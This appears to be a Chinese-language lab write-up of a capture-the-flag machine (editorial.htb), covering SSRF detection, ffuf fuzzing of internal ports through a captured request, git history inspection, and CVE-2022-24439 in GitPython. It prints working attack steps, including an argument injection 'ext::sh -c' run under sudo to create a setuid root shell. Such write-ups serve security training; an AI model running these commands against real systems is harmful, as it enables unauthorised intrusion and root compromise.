# Linkvortex

- 練習日期:   2026/03/27
- 考點:       Server-Side Request Forgery (SSRF) 、ffuf、Git、 GitPython 函式庫的 CVE-2022-24439。

## Server-Side Request Forgery (SSRF)

觀察發現 editorial.htb 存在可以輸入 URL的功能，嘗試輸入自己的 IP 並以 nc 監聽後，發現主機會透過輸入的 URL 來發出請求，可能存在 SSRF 的漏洞。

猜測內部可能存在服務主機，因此嘗試在 URL 中填入 http://127.0.0.1:80 來測試 SSRF 漏洞。

## ffuf

嘗試輸入多次 http://127.0.0.1 不同的 port 時，都會返回 `static/uploads/b6c0179a-4878-4e5c-a0b3-53e71c321585` 並沒有什麼用，於是我們可以枚舉 0-65535 個 port 來看看有哪些服務在運行：

```bash
ffuf -u http://editorial.htb/upload-cover -request ssrf.req -w <(seq 0 65535) -ac
```

其中：

- wordlist 使用 seq 0 65535 來產生 0-65535 的數字。
- -ac: 代表 auto-calibrate，會自動過濾掉回應內容相同的請求，讓我們更快找到真正有用的服務。
- ssrf.req 的內容如下，只需要在 `http://127.0.0.1:FUZZ` 中的 `FUZZ` 替換為要測試的 port 即可：

```txt
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 310
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqO8ldAaA3PCgF9C5
Accept: */*
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryqO8ldAaA3PCgF9C5
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
------WebKitFormBoundaryqO8ldAaA3PCgF9C5
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryqO8ldAaA3PCgF9C5--
```

## Git

ssh 進入 editorial.htb 後，發現 apps 目錄下有一個 .git 的資料夾，表示我們可以透過一些常用的 git 指令來查看裡面的內容：

```bash
git status              # 查看目前 git 的狀態
git log --oneline       # 查看提交紀錄
git show <commit_id>    # 查看特定提交的內容
git diff <commit_id> <commit_id>    # 查看特定提交的差異
```

## CVE-2022-24439

這東西是 GitPython < 3.1.30 的漏洞，程式碼原型大概是長這樣：

```python
r.clone_from(cmd, 'tmp', multi_options=["-c protocol.ext.allow=always"])
```

其中，只要攻擊者將 cmd 改成 `ext::sh -c touch% /tmp/pwned`，就可以新增 /tmp/pwned 檔案，於是：

```bash
echo -e '#!/bin/bash\n\ncp /bin/sh /tmp/subash\nchown root:root /tmp/subash\nchmod 6777 /tmp/subash'  > /dev/shm/shell.sh
chmod +x /dev/shm/shell.sh

sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /dev/shm/shell.sh'
/tmp/subash -p
```